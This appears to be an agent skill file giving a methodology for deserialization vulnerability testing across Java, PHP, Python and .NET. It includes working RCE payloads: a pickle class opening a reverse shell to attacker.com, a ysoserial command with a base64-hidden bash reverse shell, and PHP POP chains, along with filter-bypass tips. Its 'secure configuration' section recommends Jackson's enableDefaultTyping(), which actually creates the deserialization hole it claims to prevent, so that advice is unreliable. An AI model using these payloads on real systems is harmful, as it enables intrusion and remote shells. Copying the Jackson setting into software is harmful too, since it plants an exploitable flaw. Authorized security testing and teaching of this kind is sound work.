---
name: deserialization-testing
Description: Professional skills and methodology for deserialization vulnerability testing
version: 1.0.0
---

# Deserialization vulnerability test

## Overview

Deserialization vulnerability is a vulnerability caused by using an application to deserialize untrusted data, which may lead to remote code execution, denial of service, etc. This skill provides detection, utilization and protection methods for deserialization vulnerabilities.

## Vulnerability principle

When an application deserializes serialized data into objects, if the data source is untrustworthy, an attacker can construct malicious serialized data and execute arbitrary code during the deserialization process.

## Common formats

### Java

**Common libraries:**
- Java native serialization
- Jackson
- Fastjson
- XStream
- Apache Commons Collections

### PHP

**Common functions:**
- unserialize()
- json_decode()

### Python

**Common modules:**
- pickle
- yaml
- json

### .NET

**Common categories:**
- BinaryFormatter
- SoapFormatter
- DataContractSerializer

## Test method

### 1. Identify serialized data

**Java Serialization Features:**
```
AC ED 00 05 (hex)
rO0 (Base64)
```

**PHP Serialization Features:**
```
O:8:"stdClass"
a:2:{s:4:"test";s:4:"data";}
```

**Python pickle features:**
```
\x80\x03
```

### 2. Detect deserialization points

**Common Locations:**
- Cookie value
- Session data
- API parameters
- File upload
- cache data
- Message queue

### 3. Java deserialization

**Apache Commons Collections Utilization:**
```java
// Use ysoserial to generate Payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin
```

**Common Gadget chains:**
- CommonsCollections1-7
- Spring1-2
- ROME
- Jdk7u21

### 4. PHP deserialization

**Basic Test:**
```php
<?php
class Test {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}
echo serialize(new Test());
// O:4:"Test":1:{s:3:"cmd";s:2:"id";}
?>
```

**Magic method utilization:**
- __destruct()
- __wakeup()
- __toString()
- __call()

### 5. Python pickle

**Basic Test:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

pickle.dumps(RCE())
```

## Leverage technology

### Java RCE

**Use ysoserial:**
```bash
# Generate Payload
java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" > payload.bin

# Base64 encoding
base64 -w 0 payload.bin
```

**Manual construction:**
```java
// Construct malicious objects using Gadget chains
// Refer to ysoserial source code
```

### PHP RCE

**Utilizing POP chain:**
```php
<?php
class A {
    public $b;
    function __destruct() {
        $this->b->test();
    }
}

class B {
    public $c;
    function test() {
        call_user_func($this->c, "id");
    }
}

$a = new A();
$a->b = new B();
$a->b->c = "system";
echo serialize($a);
?>
```

### Python RCE

**Pickle RCE：**
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

## Bypass technology

### Encoding bypass

**Base64 encoding:**
```
Original: rO0ABXNy...
Coding: ck8wQUJYTnk...
```

**URL encoding:**
```
%72%4F%00%AB...
```

### Filter bypass

**Use different Gadget chains:**
- If CommonsCollections are filtered, try Spring
- If a version is filtered, try other versions

### Class name confusion

**Use reflection:**
```java
Class.forName("java.lang.Runtime").getMethod("exec", String.class)
```

## Tool usage

### ysoserial

```bash
# List available Gadgets
java -jar ysoserial.jar

# Generate Payload
java -jar ysoserial.jar CommonsCollections1 "command" > payload.bin

# Generate Base64
java -jar ysoserial.jar CommonsCollections1 "command" | base64
```

### PHPGGC

```bash
# List available Gadgets
./phpggc -l

# Generate Payload
./phpggc Monolog/RCE1 system id

# Generate encoded Payload
./phpggc -b Monolog/RCE1 system id
```

### Burp Suite

1. Intercept requests containing serialized data
2. Use plug-in to generate Payload
3. Replace original data
4. Observe the response

## Validation and reporting

### Verification steps

1. Confirm that serialized data can be controlled
2. Verify that deserialization triggers code execution
3. Assess the impact (RCE, data breach, etc.)
4. Record a complete POC

### Report Highlights

- Vulnerability location and serialized data format
- Gadget chain or exploit method used
- Complete exploitation steps and PoC
- Fix suggestions (input validation, use secure serialization, etc.)

## Protective measures

### Recommended plan

1. **Avoid deserializing untrusted data**
- Use JSON instead
- Use safe serialization format

2. **Input verification**
   ```java
   // Whitelist verification class name
   private static final Set<String> ALLOWED_CLASSES = 
       Set.of("com.example.SafeClass");
   
   private Object readObject(ObjectInputStream ois) {
       // Verify class name
       // ...
   }
   ```

3. **Use secure configuration**
   ```java
   // Jackson configuration
   objectMapper.enableDefaultTyping();
   objectMapper.setVisibility(PropertyAccessor.FIELD, 
       JsonAutoDetect.Visibility.ANY);
   ```

4. **Class loader isolation**
- Use custom ClassLoader
- Limit the classes that can be loaded

5. **Monitoring and Logging**
- Record deserialization operations
- Monitor for abnormal behavior

## Notes

- Only conducted in an authorized testing environment
- Pay attention to the differences in Gadget chains of different versions of libraries
- Pay attention to the payload size limit when testing
- Understand the dependent library versions of the target application